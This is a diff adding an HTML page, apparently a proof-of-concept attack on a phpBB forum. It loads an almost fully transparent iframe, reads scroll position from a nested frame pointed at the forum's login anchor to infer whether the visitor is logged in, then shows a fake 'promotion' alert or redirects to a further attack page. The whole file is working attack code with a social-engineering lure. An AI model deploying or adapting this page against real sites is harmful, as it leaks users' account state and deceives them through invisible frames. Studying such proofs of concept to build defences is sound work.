@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <script>
+        function check() {
+          var outer = document.getElementById("outer");
+          var inner = outer.contentWindow.document.getElementById('inner');
+          	inner.src = "http://www.originalphpbb.com/index.php#login";
+ 	  	setTimeout(alertFunc, 1000);
+        }
+
+        function alertFunc() {
+          var outer = document.getElementById("outer");
+          var inner = outer.contentWindow.document.getElementById('inner');
+          var y = inner.contentWindow.parent.scrollY
+          if (y > 0) {
+		console.log('a')
+		alert('This promotion is only for users of www.originalphpbb.com, please login before');
+          } else {
+	     window.open("getPostId.html","_self")
+	     return false;
+          }
+        }
+      </script>
+  </head>
+  <body onload="check()"></body>
+  <iframe
+    id="outer"
+    src="innerLogin.html"
+    width="1500px"
+    height="500px"
+    frameborder="none"
+    scrolling="no"
+    style="opacity:0.0001;"
+  >
+  </iframe>
+</html>
